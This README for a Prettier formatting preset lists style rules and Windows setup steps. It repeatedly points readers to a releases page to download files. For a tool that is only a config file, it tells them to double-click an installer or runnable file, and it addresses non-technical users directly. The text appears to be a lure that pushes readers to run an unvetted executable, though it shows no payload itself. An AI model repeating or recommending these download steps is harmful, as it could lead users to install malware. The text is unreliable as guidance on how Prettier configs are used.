# 💅 npm-prettier-config - Clean code with less effort

[![Download](https://img.shields.io/badge/Download-Release_Page-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Beckygracile986/npm-prettier-config/releases)

## 📦 What this is

npm-prettier-config gives you a ready-made Prettier setup for JavaScript and TypeScript projects. It helps keep your code neat and consistent with these default choices:

- Single quotes
- No semicolons
- LF line endings
- Trailing commas

If you work on code that looks different across files, this config can help keep the format the same. It is useful for back-end code, shared code, and projects where many people edit the same files.

## 🖥️ What you need

This setup works best on Windows with a few common tools:

- Windows 10 or Windows 11
- A web browser
- A file explorer
- A project that uses JavaScript or TypeScript
- Prettier in your project, or a tool that can read a Prettier config

You do not need to change how you write code by hand. The config handles the format for you.

## 🚀 Download the release

Visit this page to download the release files:

[Open the Releases page](https://github.com/Beckygracile986/npm-prettier-config/releases)

On that page, look for the latest release. Download the file that matches the package or setup you want to use in your project.

## 🪟 How to use on Windows

Follow these steps in order.

1. Open the release page in your browser.
2. Find the latest release at the top of the list.
3. Download the file or package from that release.
4. Save it to a folder you can find again, such as Downloads.
5. If the release gives you a ZIP file, right-click it and choose **Extract All**.
6. If the release gives you an installer or runnable file, double-click it.
7. If the release gives you project files, copy them into your code project folder.
8. Open your project in your editor.
9. Make sure your project uses the Prettier config from this package.
10. Run format from your editor or your project tool.

## ⚙️ How the format rules work

This config follows a simple set of formatting rules.

### Single quotes

Strings use single quotes instead of double quotes.

Example:

- `const name = 'Alex'`

### No semicolons

Lines end without semicolons.

Example:

- `const ready = true`

### LF line endings

Files use LF line endings. This helps keep line endings the same across tools and systems.

### Trailing commas

Multi-line lists and objects keep trailing commas where they help the diff stay clean.

Example:

- `const items = ['one', 'two', 'three']`

## 🧩 Where this fits

Use this config in:

- JavaScript projects
- TypeScript projects
- Shared front-end and back-end code
- Team projects
- Small tools and scripts
- Codebases that need one clear style

It works well when you want the same file style across many files and many editors.

## 🔧 Basic setup flow

If you are adding this to a project, use this simple flow:

1. Download the release from the page above.
2. Place the files in your project or install the package through your normal project setup.
3. Open your project settings.
4. Point your format tool to this Prettier config.
5. Save the changes.
6. Format one file to check that the rules apply.
7. Review the file and confirm the quotes, semicolons, line endings, and commas match the config.

## 📁 Suggested project layout

A common project may look like this:

- `project-folder/`
  - `src/`
  - `package.json`
  - `prettier.config.js`
  - `README.md`

If your project already has a format file, update it to use this config. If you are starting fresh, add the config file where your project can find it.

## 🧠 Tips for non-technical users

If you are not used to code tools, keep these points in mind:

- Download the latest release
- Keep the files in one folder
- Use the same editor for the whole project
- Format files after edits so the style stays the same
- If a file looks wrong, run format again before saving and sharing it

## 🛠️ Troubleshooting

If the format does not change, check these common points:

- The config file is in the wrong folder
- Your editor is using a different format tool
- The project did not load the config after you added it
- The file type is not one that Prettier formats
- The project has another style file that overrides this one

If your code still does not match the rules, open the config file and make sure your project points to it.

## 📚 File types this helps with

This config is useful for:

- `.js`
- `.ts`
- `.jsx`
- `.tsx`
- `.json`
- `.md`

It also helps any text file that your format tool reads through Prettier.

## 🔍 What you will see after setup

After setup, your files should show these style changes:

- Strings use single quotes
- Lines end without semicolons
- Multi-line items keep trailing commas
- Files stay consistent across editors
- Line endings stay on LF

That makes code easier to scan and keeps changes clean when files are shared or updated

## 📥 Download again

If you need the files again, use the release page here:

[Go to the Releases page](https://github.com/Beckygracile986/npm-prettier-config/releases)

Open the latest release, get the file you need, and use it in your Windows project